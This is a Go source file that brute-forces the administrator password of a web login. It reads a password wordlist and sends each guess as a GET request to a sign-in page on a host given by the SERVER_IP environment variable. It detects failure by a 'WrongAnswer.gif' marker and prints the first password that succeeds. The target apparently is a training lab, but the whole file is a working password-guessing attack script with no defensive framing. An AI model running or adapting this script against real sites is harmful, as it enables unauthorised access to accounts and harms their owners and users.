package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

var SERVER_IP, _ = os.LookupEnv("SERVER_IP")

func secondary(password string) bool {
	req, err := http.Get(fmt.Sprintf("http://%s/?page=signin&username=%s&password=%s&Login=Login", SERVER_IP, "admin", password))
	if err != nil {
		return false
	}

	defer req.Body.Close()

	body, _ := ioutil.ReadAll(req.Body)

	if strings.Contains(string(body), "<img src=\"images/WrongAnswer.gif\" alt=\"\">") {
		return false
	} else {
		return true
	}
}

func force() {
	file, err := os.Open("passwords.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		password := scanner.Text()
		fmt.Println("Testing " + password)
		if secondary(password) {
			fmt.Printf("THE ADMIN USER PASSWORD IS %s\n", password)
			return
		}
	}
	fmt.Println("THE ADMIN USER PASSWORD WAS NOT FOUND")
}

func main() {
	_, exists := os.LookupEnv("SERVER_IP")
	if !exists {
		fmt.Println("SERVER_IP not defined")
		return
	}

	force()
}
